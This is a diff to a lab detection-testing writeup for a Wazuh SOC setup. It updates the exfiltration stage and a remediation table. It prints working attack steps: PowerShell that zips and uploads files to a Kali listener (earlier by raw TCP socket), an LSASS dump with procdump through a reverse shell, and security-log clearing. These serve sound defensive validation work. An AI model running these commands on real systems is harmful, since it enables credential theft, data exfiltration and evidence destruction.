@@ -103,7 +103,7 @@ A rule can only fire if its event exists. Before the run these items were checke
 | 8b | Credential Access | Credential Access | T1003.001 | `procdump -ma lsass.exe` through the reverse shell | Sysmon EID 10 | `100411` |
 | 9 | File Lifecycle | — | — | Modify and delete files in the monitored folder | syscheck events | FIM (modified, deleted) |
 | 10 | Cleanup / Anti-Forensics | Defense Evasion | T1070.001 | `wevtutil cl Security` | Security Event `1102` | `100412` |
-| 11 | Exfiltration | Exfiltration | T1041 | `Compress-Archive`, then `TCPClient` sends the zip to Kali `:4445` | Sysmon EID 3 | `100413` |
+| 11 | Exfiltration | Exfiltration | T1059.001, T1567.002 | `Compress-Archive`, then `Invoke-WebRequest -Method Post -InFile` uploads the zip to a listener on Kali | PowerShell Operational (Module Logging) | `100413` |
 
 ---
 
@@ -639,38 +639,43 @@ Clear-EventLog -LogName Security
 
 ---
 
-### Stage 11 — Exfiltration (T1041)
+### Stage 11 — Exfiltration (T1059.001, T1567.002)
+
+**Rule rewritten since the plan above was written.** `100413` no longer watches for a network connection on port 4445 — it now reads PowerShell's own Module Logging output for an `Invoke-WebRequest` call that names a remote `Uri` and either `-Method Post` or `-InFile` (see `docs/03` §3.3). The procedure below has been updated to match; the original `TCPClient`/port-4445 version is kept in `threat-emulation/attack-scripts/` history only as a reference for how `100404`/`100414` could still catch a *non-PowerShell-logged* transfer.
 
 ```bash
-# Kali — receive the file
-nc -lvnp 4445 > received_exfil.zip
+# Kali — receive the file (simple HTTP listener instead of a raw nc socket)
+python3 -m http.server 8000 &
+# or a small script that accepts POST and saves the body, if a true upload endpoint is wanted
 ```
 
 ```powershell
 # Windows — through the reverse shell
 Compress-Archive -Path C:\Users\LENOVO\Downloads\virustotaltest -DestinationPath C:\Windows\Temp\exfil_test.zip -Force
 
-$client = New-Object System.Net.Sockets.TCPClient("192.168.60.135", 4445)
-$stream = $client.GetStream()
-$bytes  = [System.IO.File]::ReadAllBytes("C:\Windows\Temp\exfil_test.zip")
-$stream.Write($bytes, 0, $bytes.Length)
-$stream.Close()
-$client.Close()
+Invoke-WebRequest -Uri "http://192.168.60.135:8000/upload" -Method Post -InFile C:\Windows\Temp\exfil_test.zip
 ```
 
-**Status:** the writeup contains the procedure and the expected trigger (Sysmon Event ID 3, `powershell.exe` connecting to port 4445) but **no alert, no screenshot and no file-integrity check**.
+**Preconditions — not yet met, confirmed against the current repo:**
+
+1. `ossec.conf` needs a new `<localfile>` block for `Microsoft-Windows-PowerShell/Operational` (`log_format: eventchannel`) — not present yet, so Wazuh never sees the event regardless of what runs.
+2. Windows Module Logging must be turned on via Group Policy (*Administrative Templates → Windows Components → Windows PowerShell → Turn on Module Logging*) — without it, the event fires but `ContextInfo`/`Payload` stay empty and the rule's fields won't match.
+3. `threat-emulation/attack-scripts/11-exfiltration_windows.ps1` still has the old `TCPClient`/port-4445 version (and a pre-existing filename bug — it compresses to `exfil_test.zip` but reads back `exfil_data.zip`) — needs updating to the `Invoke-WebRequest` form above before it will exercise `100413`.
+
+**Status:** no alert, no screenshot, no file-integrity check — unchanged from before, but now additionally blocked on the two telemetry preconditions above, not just on running the procedure.
 
 **What a complete run should show**
 
 | Check | Expected result |
 |---|---|
-| Sysmon EID 3 | `powershell.exe` → `192.168.60.135:4445` → alert `100413` (and `100404` / `100414` for the same connection) |
+| PowerShell Operational | `Invoke-WebRequest` logged with the upload's `Uri`/`Post`/`InFile` in `Payload` → alert `100413` |
+| Sysmon EID 3 (fallback layer) | `powershell.exe` → `192.168.60.135:8000` — if port 80/443 is used instead, `100414` can also fire independently of `100413`; on an arbitrary port, only `100404` (generic PowerShell network connection) applies |
 | File creation | Zip written under `\Windows\Temp\` — candidate for `100405` if Sysmon logs the extension |
-| Data arrived | `Get-FileHash` of `exfil_test.zip` on Windows equals `sha256sum received_exfil.zip` on Kali |
+| Data arrived | `Get-FileHash` of `exfil_test.zip` on Windows equals the hash of the file received on Kali |
 
-Detection on port `4445` is signature-based and specific to this lab. A real SOC would add volume- or behaviour-based detection (unusual outbound transfer size, scripting engine talking to a rare destination).
+Content-based detection (matching the PowerShell command itself) is a real improvement over the old hard-coded port, but it only sees the upload if Module Logging is on and the attacker's tooling is PowerShell `Invoke-WebRequest` specifically — a `curl.exe`, raw socket, or `System.Net.WebClient` upload would not trigger `100413` at all, though `100404`/`100414` could still catch the network side of it.
 
-**Verdict: ❌ Not evidenced** — highest-priority item to complete.
+**Verdict: ❌ Not evidenced** — highest-priority item to complete, and now gated on the two preconditions above before a re-test is even worth attempting.
 
 ---
 
@@ -727,7 +732,7 @@ The chain was run in three sessions: Stages 1–7 on 2026-08-28, Stages 8–10 o
 
 | Priority | Stage | Gap | Action | Pass criteria |
 |---|---|---|---|---|
-| P1 | 11 | No evidence | Run the full procedure with Sysmon EID 3 enabled for the process | Raw alert `100413`; file hashes match on both hosts |
+| P1 | 11 | No evidence; `100413` was rewritten to detect `Invoke-WebRequest` via PowerShell Module Logging instead of port 4445, but the required telemetry (ossec.conf localfile + GPO) isn't collected yet, and the attack script still uses the old `TCPClient` approach | Add the `Microsoft-Windows-PowerShell/Operational` localfile to `ossec.conf`, enable Module Logging via GPO, update `11-exfiltration_windows.ps1` to use `Invoke-WebRequest -Method Post -InFile`, then run it | Raw alert `100413`; file hashes match on both hosts |
 | P1 | 8b | No true-positive test run — `procdump.exe` is not staged on the victim; only Defender's own benign LSASS scan has been observed (correctly ignored by `100411`) | Stage `procdump.exe` (or an equivalent LSASS-access tool) on the victim and run it through the reverse shell | Raw alert `100411` (and, if the call trace shows `dbghelp.dll`/`dbgcore.dll`, `100416`) with `sourceImage: procdump.exe` |
 | P1 | 3 | `100410` still uses `if_sid=60106` (shared with the winning built-in `92657`) instead of chaining under `92657` directly; `frequency` was also raised from `1` to `2`, which may independently prevent it from firing on a single brute-force-then-login sequence | Change to `<if_sid>92657</if_sid>`; revert `frequency` to `1` unless multiple bursts are specifically intended; re-run the Stage 2→3 sequence once | Raw `100410` alert alongside (or instead of) `92657` |
 | P1 | 1 | WAN-side re-test attempted, no clean evidence (suspect NAT hairpin, see Stage 1) | Repeat the WAN-side scan with `tcpdump` on both pfSense interfaces (WAN and LAN) simultaneously | Confirm whether the true source IP survives the NAT hop; raw `100300` or pfSense alert with a genuine external `srcip` |
